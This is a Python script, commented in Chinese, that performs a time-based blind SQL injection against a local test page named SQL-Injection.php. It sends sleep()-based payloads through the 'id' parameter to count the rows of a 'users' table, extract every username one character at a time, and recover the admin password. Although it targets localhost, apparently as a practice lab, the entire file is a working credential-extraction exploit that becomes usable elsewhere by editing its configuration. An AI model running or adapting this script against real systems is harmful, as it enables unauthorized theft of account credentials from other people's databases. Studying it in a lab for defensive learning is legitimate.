"""
时间盲注 - 用户名和密码爆破脚本
适用环境：本地 SQL-Injection.php 测试页面，表名 users，字段 username 和 password
判断依据：若条件为真则延时 2 秒，通过请求超时检测来判断
"""

import string
import requests
import sys

# 配置
TARGET_URL = "http://localhost/SQL-Injection.php"
TIMEOUT = 1.5                    # 正常请求超时时间（应小于 sleep 时间）
SLEEP_TIME = 2                   # 延时秒数（必须大于 TIMEOUT）
TABLE_NAME = "users"              # 表名
USERNAME_FIELD = "username"       # 用户名字段名
PASSWORD_FIELD = "password"       # 密码字段名
TARGET_USERNAME = "admin"         # 要爆破密码的目标用户名
MAX_ROWS = 20                     # 最大用户数量
MAX_FIELD_LENGTH = 30             # 字段最大长度

# 字符集：数字、大小写字母、下划线（可根据需要扩展）
CHARSET = string.digits + string.ascii_letters + '_'

def make_request(payload):
    """发送请求，若触发超时则返回 True，否则返回 False"""
    params = {'id': payload}
    try:
        requests.get(TARGET_URL, params=params, timeout=TIMEOUT)
        return False  # 未超时，条件为假
    except requests.exceptions.ReadTimeout:
        return True   # 超时，条件为真
    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return False

def get_row_count():
    """获取表中的记录总数"""
    print("[*] 正在爆破记录总数...")
    for cnt in range(1, MAX_ROWS + 1):
        payload = f"1' and if((select count(*) from {TABLE_NAME}) = {cnt}, sleep({SLEEP_TIME}), 1) -- -"
        if make_request(payload):
            print(f"[+] 记录总数: {cnt}")
            return cnt
    print("[-] 未找到记录总数（可能超过 MAX_ROWS 或表名错误）")
    sys.exit(1)

def get_field_length_by_offset(field, offset):
    """获取第 offset 行（从0开始）指定字段的长度"""
    for length in range(1, MAX_FIELD_LENGTH + 1):
        payload = f"1' and if(length((select {field} from {TABLE_NAME} limit {offset},1)) = {length}, sleep({SLEEP_TIME}), 1) -- -"
        if make_request(payload):
            return length
    return 0

def get_field_value_by_offset(field, offset, length):
    """逐字符获取第 offset 行指定字段的值"""
    value = ""
    for pos in range(1, length + 1):
        found = False
        for ch in CHARSET:
            payload = f"1' and if(substr((select {field} from {TABLE_NAME} limit {offset},1), {pos},1) = '{ch}', sleep({SLEEP_TIME}), 1) -- -"
            if make_request(payload):
                value += ch
                print(f"[+] 第 {pos} 位: {ch}")
                found = True
                break
        if not found:
            print(f"[-] 第 {pos} 位未匹配到字符，置为 '?'")
            value += '?'
    return value

def get_field_length_by_condition(field, condition):
    """根据条件（如 where username='admin'）获取字段长度，假设只返回一行"""
    for length in range(1, MAX_FIELD_LENGTH + 1):
        payload = f"1' and if(length((select {field} from {TABLE_NAME} {condition} limit 0,1)) = {length}, sleep({SLEEP_TIME}), 1) -- -"
        if make_request(payload):
            return length
    return 0

def get_field_value_by_condition(field, condition, length):
    """根据条件逐字符获取字段值"""
    value = ""
    for pos in range(1, length + 1):
        found = False
        for ch in CHARSET:
            payload = f"1' and if(substr((select {field} from {TABLE_NAME} {condition} limit 0,1), {pos},1) = '{ch}', sleep({SLEEP_TIME}), 1) -- -"
            if make_request(payload):
                value += ch
                print(f"[+] 第 {pos} 位: {ch}")
                found = True
                break
        if not found:
            print(f"[-] 第 {pos} 位未匹配到字符，置为 '?'")
            value += '?'
    return value

def main():
    print("=" * 60)
    print("时间盲注 - 用户名和密码爆破")
    print(f"目标表: {TABLE_NAME}")
    print("=" * 60)

    # 1. 获取总记录数
    row_count = get_row_count()

    # 2. 爆破所有用户名
    usernames = []
    print("\n[*] 开始爆破所有用户名...")
    for idx in range(row_count):
        print(f"\n[*] 正在爆破第 {idx} 个用户名...")
        length = get_field_length_by_offset(USERNAME_FIELD, idx)
        if length == 0:
            print(f"[-] 第 {idx} 个用户名长度获取失败，跳过")
            usernames.append("?")
            continue
        print(f"[+] 第 {idx} 个用户名长度: {length}")
        name = get_field_value_by_offset(USERNAME_FIELD, idx, length)
        usernames.append(name)
        print(f"[+] 第 {idx} 个用户名: {name}")

    # 3. 输出所有用户名
    print("\n" + "=" * 60)
    print("所有用户名:")
    for idx, name in enumerate(usernames):
        print(f"[{idx}]: {name}")
    print("=" * 60)

    # 4. 爆破指定用户的密码
    condition = f"where {USERNAME_FIELD} = '{TARGET_USERNAME}'"
    print(f"\n[*] 正在爆破用户 '{TARGET_USERNAME}' 的密码...")
    length = get_field_length_by_condition(PASSWORD_FIELD, condition)
    if length == 0:
        print(f"[-] 用户 '{TARGET_USERNAME}' 密码长度获取失败")
    else:
        print(f"[+] 密码长度: {length}")
        password = get_field_value_by_condition(PASSWORD_FIELD, condition, length)
        print(f"[+] 用户 '{TARGET_USERNAME}' 的密码: {password}")

    print("\n" + "=" * 60)
    print("脚本执行完毕")
    print("=" * 60)

if __name__ == "__main__":
    main()